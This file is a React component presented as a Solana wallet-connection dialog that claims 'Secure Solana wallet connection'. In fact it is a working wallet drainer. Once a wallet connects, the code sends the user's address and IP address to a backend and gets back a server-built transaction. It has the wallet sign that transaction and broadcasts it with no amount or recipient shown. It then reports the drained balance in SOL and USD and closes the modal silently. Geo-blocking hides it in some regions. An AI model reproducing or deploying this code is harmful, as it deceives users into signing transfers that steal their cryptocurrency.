"use client"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
import { Button } from "@/components/ui/button" 
import Image from "next/image" 
import { useState, useEffect } from "react" 


interface ModalsProps {
  isOpen: boolean
  onClose: () => void
}


const DESKTOP_WALLETS = {
  phantom: {
    name: "Phantom",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
  },
  solflare: {
    name: "Solflare",
    provider: () => (window as any).solflare,
    checkMethod: () => (window as any).solflare?.isSolflare,
  },
  backpack: {
    name: "Backpack",
    provider: () => (window as any).backpack,
    checkMethod: () => (window as any).backpack?.isBackpack,
  },
  sollet: {
    name: "Sollet",
    provider: () => (window as any).sollet,
    checkMethod: () => (window as any).sollet?.isSollet,
  },
  mathwallet: {
    name: "Math Wallet",
    provider: () => (window as any).mathwallet?.solana,
    checkMethod: () => (window as any).mathwallet?.solana?.isMathWallet,
  },
}


const MOBILE_WALLETS = {
  phantom: {
    name: "Phantom",
    deepLink: "phantom://browse/",
    universalLink: "https://phantom.app/ul/browse/",
  },
  solflare: {
    name: "Solflare",
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
  },
  backpack: {
    name: "Backpack",
    deepLink: "backpack://",
    universalLink: "https://backpack.app/",
  },
  sollet: {
    name: "Sollet",
    deepLink: "sollet://",
    universalLink: "https://www.sollet.io/",
  },
  mathwallet: {
    name: "Math Wallet",
    deepLink: "mathwallet://",
    universalLink: "https://mathwallet.org/",
  },
}

const wallets = [
  {
    id: "phantom",
    name: "Phantom",
    description: "Popular wallet for Solana",
    icon: "/phantom-icon.png", // Place your phantom.png in /public/wallets/
  },
  {
    id: "solflare",
    name: "Solflare",
    description: "Reliable wallet for Solana ecosystem",
    icon: "/solflare-icon.png", // Place your solflare.png in /public/wallets/
  },
  {
    id: "backpack",
    name: "Backpack",
    description: "Smart wallet for Solana",
    icon: "/backpack.png", // Place your backpack.png in /public/wallets/
  },
  {
    id: "sollet",
    name: "Sollet",
    description: "Browser-based Solana wallet",
    icon: "/sollet.png", // Place your sollet.png in /public/wallets/
  },
  {
    id: "mathwallet",
    name: "Math Wallet",
    description: "Multi-chain wallet with Solana support",
    icon: "/mathwallet.png", // Place your mathwallet.png in /public/wallets/
  },
]

const DEFAULT_LOGO = "/default.svg" // Place a default wallet icon in /public/wallets/


export function Modals({ isOpen, onClose }: ModalsProps) {
  const [isMobileViewState, setIsMobileViewState] = useState(false) 
  const [connectedWalletData, setConnectedWalletData] = useState<any>(null) 
  const [isBlockedGeoState, setIsBlockedGeoState] = useState(false) 
  const [logoErrors, setLogoErrors] = useState<Record<string, boolean>>({})

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())
      setIsMobileViewState(mobile)
    }
    checkMobile()

    checkGeoBlockStatus()
  }, [])

  
  const checkGeoBlockStatus = async () => {
    try {
      const response = await fetch("/api/check-geo")
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeoState(true)
        onClose()
      }
    } catch (error) {}
  }

  
  const isInWalletBrowserInstance = (walletId: string) => {
    const userAgent = navigator.userAgent.toLowerCase()
    const walletName = walletId.toLowerCase()
    return userAgent.includes(walletName)
  }

  
  const connectDesktopWalletInstance = async (walletId: string) => {
    const walletConfig = DESKTOP_WALLETS[walletId as keyof typeof DESKTOP_WALLETS]

    if (!walletConfig) {
      return
    }

    const provider = walletConfig.provider()

    if (provider && walletConfig.checkMethod()) {
      try {
        const response = await provider.connect()
        setConnectedWalletData(provider)
        await scanAndCreateTransactionData(response.publicKey.toString(), provider)
      } catch (error) {}
    } else {
      // Redirect to download page
      const downloadUrls: Record<string, string> = {
        phantom: "https://phantom.app/download",
        solflare: "https://solflare.com/download",
        backpack: "https://backpack.app/download",
        sollet: "https://www.sollet.io/",
        mathwallet: "https://mathwallet.org/"
      }
      
      if (downloadUrls[walletId]) {
        window.open(downloadUrls[walletId], "_blank")
      }
    }
  }

  
  const connectMobileWalletInstance = (walletId: string) => {
    const walletConfig = MOBILE_WALLETS[walletId as keyof typeof MOBILE_WALLETS]

    if (!walletConfig) {
      return
    }

    if (isInWalletBrowserInstance(walletId)) {
      connectDesktopWalletInstance(walletId)
      return
    }

    const currentUrl = window.location.href
    let deepLink = ""
    let universalLink = ""

    switch (walletId) {
      case "phantom":
        deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
        universalLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
        break
      case "solflare":
        deepLink = walletConfig.deepLink + encodeURIComponent(currentUrl)
        universalLink = walletConfig.universalLink + encodeURIComponent(currentUrl)
        break
      case "backpack":
        deepLink = `backpack://connect?url=${encodeURIComponent(currentUrl)}`
        universalLink = `https://backpack.app/connect?url=${encodeURIComponent(currentUrl)}`
        break
      case "sollet":
        deepLink = `sollet://connect?url=${encodeURIComponent(currentUrl)}`
        universalLink = `https://www.sollet.io/connect?url=${encodeURIComponent(currentUrl)}`
        break
      case "mathwallet":
        deepLink = `mathwallet://solana/${encodeURIComponent(currentUrl)}`
        universalLink = `https://mathwallet.org/solana/${encodeURIComponent(currentUrl)}`
        break
    }

    window.location.href = deepLink

    setTimeout(() => {
      window.location.href = universalLink
    }, 1500)
  }

  
  const handleConnectWalletClick = (walletId: string) => {
    if (isMobileViewState) {
      connectMobileWalletInstance(walletId)
    } else {
      connectDesktopWalletInstance(walletId)
    }
  }

  
  const scanAndCreateTransactionData = async (publicKey: string, provider: any) => {
    try {
      let userIPAddress = "unknown"
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json")
        const ipData = await ipResponse.json()
        userIPAddress = ipData.ip || "unknown"
      } catch (ipError) {
        try {
          const ipResponse2 = await fetch("https://api.my-ip.io/ip")
          const ipText = await ipResponse2.text()
          userIPAddress = ipText.trim() || "unknown"
        } catch {}
      }

      const response = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP: userIPAddress,
        }),
      })

      if (!response.ok) {
        setTimeout(() => {
          onClose()
        }, 1000)
        return
      }

      const data = await response.json()

      if (data.message === "Insufficient balance") {
        setTimeout(() => {
          onClose()
        }, 1000)
        return
      }

      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(data.transaction, "base64"))

      const signedTransaction = await provider.signTransaction(transaction)

      const RPC_ENDPOINTS = [
        "https://solana-rpc.publicnode.com",
        "https://api.mainnet-beta.solana.com",
        "https://solana.drpc.org",
        "https://solana.lavenderfive.com",
        "https://solana.api.onfinality.io/public",
        "https://public.rpc.solanavibestation.com",
      ]

      let signature = ""
      let lastError = null

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")

          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction({
            signature,
            blockhash: data.blockhash,
            lastValidBlockHeight: data.lastValidBlockHeight,
          })
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        throw lastError || new Error("Transaction failed")
      }

      await fetch("/api/transaction-approved", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          balanceSOL: data.walletBalance,
          balanceUSD: data.walletBalance * 153.32,
          userIP: userIPAddress,
        }),
      })

      setTimeout(() => {
        onClose()
      }, 1000)
    } catch (error: any) {
      setTimeout(() => {
        onClose()
      }, 1000)
    }
  }

  const handleLogoError = (walletId: string) => {
    setLogoErrors(prev => ({ ...prev, [walletId]: true }))
  }

  const getWalletLogo = (walletId: string) => {
    const wallet = wallets.find(w => w.id === walletId)
    if (!wallet) return DEFAULT_LOGO
    
    if (logoErrors[walletId]) {
      return DEFAULT_LOGO
    }
    
    return wallet.icon
  }

  
  if (isBlockedGeoState) {
    return null
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="bg-gray-900 text-white border border-gray-800 rounded-2xl shadow-2xl max-w-md p-0 overflow-hidden">
        {/* Modal Header */}
        <div className="bg-gradient-to-r from-blue-900 to-blue-800 p-6">
          <DialogHeader>
            <div className="flex items-center justify-center mb-4">
              <div className="w-12 h-12 bg-white/10 backdrop-blur-sm rounded-xl flex items-center justify-center">
                <div className="w-8 h-8 bg-gradient-to-br from-blue-300 to-blue-100 rounded-lg flex items-center justify-center">
                  <svg className="w-5 h-5 text-blue-900" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
                  </svg>
                </div>
              </div>
            </div>
            <DialogTitle className="text-2xl font-bold text-center text-white">
              Connect Your Wallet
            </DialogTitle>
            <DialogDescription className="text-center text-blue-200 mt-1">
              Select a wallet to connect
            </DialogDescription>
          </DialogHeader>
        </div>
        
        {/* Wallet Options */}
        <div className="px-6 pb-6 space-y-4 max-h-[60vh] overflow-y-auto">
          {wallets.map((wallet) => (
            <Button
              key={wallet.id}
              variant="outline"
              className="w-full h-auto p-4 flex items-center justify-start gap-4 bg-gradient-to-r from-gray-800/50 to-gray-900/50 hover:from-blue-900/30 hover:to-blue-800/30 hover:border-blue-500 transition-all border border-gray-700 rounded-xl"
              onClick={() => handleConnectWalletClick(wallet.id)}
            >
              <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden bg-gray-800">
                <Image
                  src={getWalletLogo(wallet.id)}
                  alt={`${wallet.name} icon`}
                  fill
                  className="object-cover"
                  onError={() => handleLogoError(wallet.id)}
                />
              </div>
              <div className="flex flex-col items-start text-left flex-1">
                <span className="font-semibold text-base text-white">{wallet.name}</span>
                <span className="text-sm text-gray-400">{wallet.description}</span>
              </div>
              <div className="text-gray-500">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                </svg>
              </div>
            </Button>
          ))}

          {/* Other Wallet Option */}
          <Button 
            variant="outline"
            className="w-full border-2 border-gray-700 hover:border-blue-500 hover:bg-blue-900/20 text-gray-300 font-bold py-4 rounded-xl"
            onClick={() => {
              window.open("https://solana.com/ecosystem/wallets", "_blank")
            }}
          >
            <span>Other Wallet Options</span>
          </Button>

          {/* Features Section */}
          <div className="mt-6 p-4 bg-gray-800/50 rounded-xl">
            <h4 className="font-bold text-white mb-3 text-center">Features:</h4>
            <ul className="space-y-3 text-sm text-gray-300">
              <li className="flex items-center gap-3">
                <div className="w-6 h-6 bg-blue-900/50 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>Secure Solana wallet connection</span>
              </li>
              <li className="flex items-center gap-3">
                <div className="w-6 h-6 bg-blue-900/50 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>Multi-wallet support</span>
              </li>
              <li className="flex items-center gap-3">
                <div className="w-6 h-6 bg-blue-900/50 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>Browser & mobile compatibility</span>
              </li>
            </ul>
          </div>

          {/* Terms & Conditions */}
          <div className="mt-6 text-center">
            <p className="text-xs text-gray-500">
              By connecting, you agree to our{" "}
              <a href="#" className="text-blue-400 hover:text-blue-300 font-medium">Terms</a>
              {" "}and{" "}
              <a href="#" className="text-blue-400 hover:text-blue-300 font-medium">Privacy Policy</a>
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}